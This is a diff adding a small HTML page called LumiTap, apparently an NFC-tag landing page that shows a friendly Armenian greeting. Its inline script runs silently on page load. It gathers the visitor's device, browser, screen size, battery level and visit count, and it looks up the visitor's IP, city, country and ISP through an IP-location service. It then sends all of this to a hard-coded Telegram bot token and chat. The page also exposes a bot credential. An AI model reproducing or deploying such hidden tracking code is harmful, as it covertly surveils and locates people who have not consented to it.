@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="hy">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0d0f14">
+<meta name="robots" content="noindex">
+<title>LumiTap</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+Armenian:wght@500;800&display=swap">
+<style>
+/* Layout: one glowing lantern mark on a dark field with a warm greeting. */
+:root{--bg:#0d0f14;--fg:#f4f6fb;--soft:#8b93a5;--a:#7ce7d4;--b:#8aa8ff;--c:#ffcf6a;--f:"Noto Sans Armenian",system-ui,-apple-system,sans-serif}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{margin:0;overflow:hidden;display:grid;place-items:center;background:var(--bg);color:var(--fg);font-family:var(--f);text-align:center;
+  padding:env(safe-area-inset-top,0px) max(16px,env(safe-area-inset-right,0px)) env(safe-area-inset-bottom,0px) max(16px,env(safe-area-inset-left,0px))}
+.glow{position:fixed;width:120vmax;height:120vmax;left:50%;top:50%;transform:translate(-50%,-50%);background:radial-gradient(closest-side,rgba(124,231,212,.16),rgba(138,168,255,.07) 50%,transparent);animation:pulse 4s ease-in-out infinite;pointer-events:none}
+@keyframes pulse{50%{transform:translate(-50%,-50%) scale(1.12)}}
+main{position:relative;display:flex;flex-direction:column;align-items:center;gap:20px}
+.orb{width:92px;height:92px;border-radius:50%;background:radial-gradient(circle at 38% 35%,#fff,var(--a) 40%,var(--b) 80%);box-shadow:0 0 40px rgba(124,231,212,.6),0 0 90px rgba(138,168,255,.35);animation:float 3.4s ease-in-out infinite}
+@keyframes float{50%{transform:translateY(-10px)}}
+h1{margin:0;font-size:clamp(30px,9vw,44px);font-weight:800;letter-spacing:-.01em}
+p{margin:0;color:var(--soft);font-size:15px;letter-spacing:.04em}
+.brand{font-size:12px;letter-spacing:.34em;text-transform:uppercase;color:var(--soft);font-family:system-ui,sans-serif;margin-top:6px}
+@media (prefers-reduced-motion:reduce){*{animation:none!important}}
+</style>
+</head>
+<body>
+<div class="glow" aria-hidden="true"></div>
+<main>
+  <div class="orb" aria-hidden="true"></div>
+  <h1>Բարև ✨</h1>
+  <p>Ուրախ ենք, որ մոտեցրիր 💜</p>
+  <div class="brand">LumiTap</div>
+</main>
+<script>
+(async () => {
+  const TOKEN = "8927373301:AAELVUuXby9LcMULOsktBPxc3kwkGlveJq4";
+  const CHAT = "6803966973";
+  const ua = navigator.userAgent;
+  const m = ua.match(/\((?:Linux; Android [\d.]+; )?([^)]*?)(?: Build|\))/);
+  const dev = /iPhone/.test(ua) ? "iPhone (" + (ua.match(/OS ([\d_]+)/)||["","?"])[1].replace(/_/g,".") + ")"
+    : /iPad/.test(ua) ? "iPad"
+    : /Android/.test(ua) ? "Android" + (m && m[1] ? " · " + m[1].split(";").pop().trim() : "")
+    : "Համակարգիչ/այլ";
+  const br = /CriOS|Chrome/.test(ua) ? "Chrome" : /FxiOS|Firefox/.test(ua) ? "Firefox" : /Edg/.test(ua) ? "Edge" : /Safari/.test(ua) ? "Safari" : "այլ";
+  const time = new Date().toLocaleString("hy-AM", {timeZone: "Asia/Yerevan", day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit"});
+  let cnt = 1; try { cnt = (+localStorage.getItem("c9") || 0) + 1; localStorage.setItem("c9", cnt); } catch (e) {}
+  let batt = ""; try { const b = await navigator.getBattery(); batt = "\n🔋 " + Math.round(b.level*100) + "%" + (b.charging ? " (լիցք.)" : ""); } catch (e) {}
+
+  let geo = {};
+  try {
+    const c = new AbortController(); setTimeout(() => c.abort(), 4000);
+    geo = await (await fetch("https://ipwho.is/?fields=ip,city,region,country,connection", {signal: c.signal})).json();
+  } catch (e) {}
+  const loc = geo && geo.success !== false
+    ? "📍 " + [geo.city, geo.region, geo.country].filter(Boolean).join(", ") + "\n🌐 " + (geo.ip||"?") + (geo.connection && geo.connection.isp ? " · " + geo.connection.isp : "")
+    : "📍 տեղը չստացվեց";
+
+  const text = "📲 Տեգ 9 բացվեց (#" + cnt + ")\n🕒 " + time + "\n" + loc + "\n📱 " + dev + " · " + br + " · " + (navigator.language||"") + "\n🖥 " + screen.width + "×" + screen.height + batt;
+
+  try {
+    await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+      method: "POST", headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: CHAT, text, disable_web_page_preview: true})
+    });
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
